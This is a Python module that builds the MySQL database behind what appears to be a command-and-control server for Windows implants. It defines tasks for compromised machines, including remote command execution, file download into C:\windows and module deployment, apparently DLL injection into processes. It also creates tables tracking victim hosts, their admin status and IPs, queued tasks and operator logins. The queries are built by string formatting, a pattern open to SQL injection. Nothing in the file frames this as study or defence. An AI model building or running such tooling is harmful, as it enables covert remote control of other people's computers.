import sys
import hashlib
import pymysql
import threading
from .config import Config
 
# (task_code, name, arg1default, arg2default)
#       use 'disabled' to remove argument
#       Be careful modifying names and task_codes!
Commands = '''
(1, 'Execute', 'cmd.exe /c ipconfig', 'disabled'),
(2, 'Download', 'https://site.com/file', 'C:\\\\windows\\\\file'),
(3, 'Set Period', '10 (minutes)', 'disabled'),
(4, 'Short Sleep', '120 (seconds)', 'disabled'),
(5, 'Process List', 'disabled', 'disabled'),
(6, 'Deploy Module', 'module', 'process.exe OR local'),
(99, 'Exit', 'disabled', 'disabled');
'''

ReturnCodes = '''
(0, 'Command completed successfully!'),
(1, 'Failed to complete task!'),
(2, 'Functionality not implemented in current version!'),
(3, 'Failed to download file!'),
(4, 'Failed to create process!'),
(5, 'Process is still running.'),
(6, 'Failed to save file!'),
(7, 'Failed to identify process!'),
(8, 'Failed to convert DLL!'),
(9, 'Failed to open process!'),
(10, 'Architecture Mismatch!'),
(11, 'Failed to create thread!'),
(12, 'Failed to write memory!')
'''

OperatingSystems = '''
(1, 'Windows XP', '5.10'),
(2, 'Windows Vista', '6.00'),
(3, 'Windows 7', '6.10'),
(4, 'Windows 8', '6.20'),
(5, 'Server 2008 R2', '6.11'),
(6, 'Server 2012', '6.21'),
(7, 'Server 2008', '6.01'),
(8, 'Server 2012 R2', '6.31'),
(9, 'Windows 8.1', '6.30'),
(10, 'Server 2003', '5.21'),
(11, 'Windows XP x64', '5.20'),
(12, 'Windows 10', '10.00'),
(13, 'Server 2016', '10.01');
'''

# Create thead local storage proxies so 
# pymysql connections are unique accross threads
holder = threading.local()

class _ThreadLocalProxy(object):

    __slots__ = ['__attrname__', '__dict__']

    def __init__(self, attrname):
        self.__attrname__ = attrname

    def __getattr__(self, name):
        global connection

        try:
            getattr(holder, self.__attrname__)
        except:
            if self.__attrname__ is 'cursor':
                setattr(holder, self.__attrname__, connection.cursor())
                try: connection.cursor().execute('USE `{0}`'.format(Config.db))
                except: pass

            if self.__attrname__ is 'connection':
                setattr(holder,
                    'connection',
                    pymysql.connect(
                    host=Config.db_host, 
                    user=Config.db_user, 
                    passwd=Config.db_pass,
                    autocommit=True)
                )

        return getattr(getattr(holder, self.__attrname__), name)

    def __setattr__(self, name, value):
        if name in ('__attrname__', ):
            object.__setattr__(self, name, value)
        else:
            child = getattr(holder, self.__attrname__)
            setattr(child, name, value)

    def __delattr__(self, name):
        child = getattr(holder, self.__attrname__)
        delattr(child, name)

    @property
    def __dict__(self):
        child = getattr(holder, self.__attrname__)
        d = child.__class__.__dict__.copy()
        d.update(child.__dict__)
        return d

    def __getitem__(self, key):
        child = getattr(holder, self.__attrname__)
        return child[key]

    def __setitem__(self, key, value):
        child = getattr(holder, self.__attrname__)
        child[key] = value

    def __delitem__(self, key):
        child = getattr(holder, self.__attrname__)
        del child[key]

    def __contains__(self, key):
        child = getattr(holder, self.__attrname__)
        return key in child

    def __len__(self):
        child = getattr(holder, self.__attrname__)
        return len(child)

    def __nonzero__(self):
        child = getattr(holder, self.__attrname__)
        return bool(child)
    # Python 3
    __bool__ = __nonzero__

connection = _ThreadLocalProxy('connection')
cursor = _ThreadLocalProxy('cursor')

def check_database_exists():
    global connection, cursor

    cursor.execute("SELECT COUNT(*) FROM information_schema.schemata WHERE schema_name = '{0}'".format(Config.db))

    if cursor.fetchone()[0] == 1:
        cursor.execute('USE `{0}`'.format(Config.db))
        return True
    
    return False

def delete_database():
    global cursor

    try:
        cursor.execute('DROP DATABASE `{0}`'.format(Config.db))
    except:
        print('[!] Database {0} could not be deleted'.format(Config.db))

def update_skeleton():
    cursor.execute('DELETE FROM `operatingsystems`')
    cursor.execute('DELETE FROM `returncodes`')
    cursor.execute('DELETE FROM `taskcodes`')

    cursor.execute('''
    INSERT INTO `taskcodes` VALUES
    {0}
    '''.format(Commands))

    cursor.execute('''
    INSERT INTO `returncodes` VALUES
    {0}
    '''.format(ReturnCodes))

    cursor.execute('''
    INSERT INTO `operatingsystems` VALUES
    {0}
    '''.format(OperatingSystems))   

    return True

    
def create_database():
    global cursor

    cursor.execute('CREATE DATABASE `{0}`'.format(Config.db))
    cursor.execute('USE `{0}`'.format(Config.db))

    # Static tables

    cursor.execute('''
    CREATE TABLE IF NOT EXISTS `taskcodes` (
    `code` int(11) NOT NULL,
    `name` varchar(50) NOT NULL,
    `arg1default` varchar(100) NOT NULL,
    `arg2default` varchar(100) NOT NULL,
    UNIQUE KEY `code` (`code`)
    ) ENGINE=InnoDB DEFAULT CHARSET=utf8;
    ''')

    cursor.execute('''
    INSERT INTO `taskcodes` VALUES
    {0}
    '''.format(Commands))

    cursor.execute('''
    CREATE TABLE IF NOT EXISTS `returncodes` (
    `code` int(11) NOT NULL,
    `message` varchar(500) NOT NULL,
    UNIQUE KEY `code` (`code`)
    ) ENGINE=InnoDB DEFAULT CHARSET=utf8;    
    ''')

    cursor.execute('''
    INSERT INTO `returncodes` VALUES
    {0}
    '''.format(ReturnCodes))
    
    cursor.execute('''
    CREATE TABLE IF NOT EXISTS `operatingsystems` (
    `id` int(11) NOT NULL AUTO_INCREMENT,
    `name` varchar(50) NOT NULL,
    `version` varchar(25) NOT NULL,
    PRIMARY KEY (`id`)
    ) ENGINE=InnoDB  DEFAULT CHARSET=utf8 AUTO_INCREMENT=1 ;
    ''')

    cursor.execute('''
    INSERT INTO `operatingsystems` VALUES
    {0}
    '''.format(OperatingSystems))

    # Dynamic tables

    cursor.execute('''
    CREATE TABLE IF NOT EXISTS `config` (
    `name` varchar(50) NOT NULL,
    `value` varchar(500) NOT NULL
    ) ENGINE=InnoDB  DEFAULT CHARSET=utf8 AUTO_INCREMENT=1 ;
    ''')

    cursor.execute('''
    CREATE TABLE IF NOT EXISTS `autorun` (
    `id` int NOT NULL AUTO_INCREMENT,
    `taskcode` int,
    `argument1` varchar(1024) NOT NULL,
    `argument2` varchar(1024) NOT NULL,
    PRIMARY KEY (`id`),
    UNIQUE KEY `id` (`id`)
    ) ENGINE=InnoDB  DEFAULT CHARSET=utf8 AUTO_INCREMENT=1 ;
    ''')

    cursor.execute('''
    CREATE TABLE IF NOT EXISTS `modules` (
    `id` int NOT NULL AUTO_INCREMENT,
    `dateadded` varchar(100) NOT NULL,
    `name` varchar(500) NOT NULL,
    `data` longtext NOT NULL,
    `size` INT NOT NULL,
    PRIMARY KEY (`id`),
    UNIQUE KEY `id` (`id`)
    ) ENGINE=InnoDB DEFAULT CHARSET=utf8 AUTO_INCREMENT=1 ;
    ''')

    cursor.execute('''
    CREATE TABLE IF NOT EXISTS `targets` (
    `id` int(11) NOT NULL AUTO_INCREMENT,
    `instance` varchar(20) NOT NULL,
    `cbperiod` int NOT NULL,
    `lastupdate` varchar(100) NOT NULL,
    `machineguid` varchar(100) NOT NULL,
    `hostname` varchar(100) NOT NULL,
    `isadmin` bool NOT NULL DEFAULT 0,
    `tbversion` varchar(10) NOT NULL,
    `ipaddress` varchar(500) NOT NULL,
    `osversion` varchar(20) NOT NULL,
    `architecture` varchar(10) NOT NULL,
    `processid` varchar(10) NOT NULL,
    PRIMARY KEY (`id`),
    UNIQUE KEY `id` (`id`)
    ) ENGINE=MyISAM DEFAULT CHARSET=utf8 AUTO_INCREMENT=1;
    ''')

    cursor.execute('''
    CREATE TABLE IF NOT EXISTS `radar` (
    `id` int(11) NOT NULL AUTO_INCREMENT,
    `source` varchar(50) NOT NULL,
    `address` varchar(50) NOT NULL,
    `time` varchar(100) NOT NULL,
    `target` int,
    PRIMARY KEY (`id`),
    UNIQUE KEY `id` (`id`),
    FOREIGN KEY (target) REFERENCES targets(id)
    ) ENGINE=MyISAM DEFAULT CHARSET=utf8 AUTO_INCREMENT=1;
    ''')

    cursor.execute('''
    CREATE TABLE IF NOT EXISTS `tasking` (
    `id` int(11) NOT NULL AUTO_INCREMENT,
    `unique` int NOT NULL,
    `taskcode` int,
    `target` int,
    `argument1` varchar(1024) NOT NULL,
    `argument2` varchar(1024) NOT NULL,
    `status` varchar(100) NOT NULL,
    `return_data` longtext,
    `return_code` int,
    `winapi_code` int,
    `opentime` varchar(100) NOT NULL,
    `sendtime` varchar(100) NOT NULL,
    `closetime` varchar(100) NOT NULL,
    PRIMARY KEY (`id`),
    UNIQUE KEY `id` (`id`),
    FOREIGN KEY (taskcode) REFERENCES taskcodes(id),
    FOREIGN KEY (target) REFERENCES targets(id)
    ) ENGINE=MyISAM DEFAULT CHARSET=utf8;
    ''')

    cursor.execute('''   
    CREATE TABLE IF NOT EXISTS `users` (
    `id` int(11) NOT NULL AUTO_INCREMENT,
    `username` varchar(500) NOT NULL,
    `password` varchar(500) NOT NULL,
    `lastlogin` varchar(500) NOT NULL,
    PRIMARY KEY (`id`),
    UNIQUE KEY `id` (`id`)
    ) ENGINE=MyISAM DEFAULT CHARSET=utf8 AUTO_INCREMENT=1 ;
    ''')
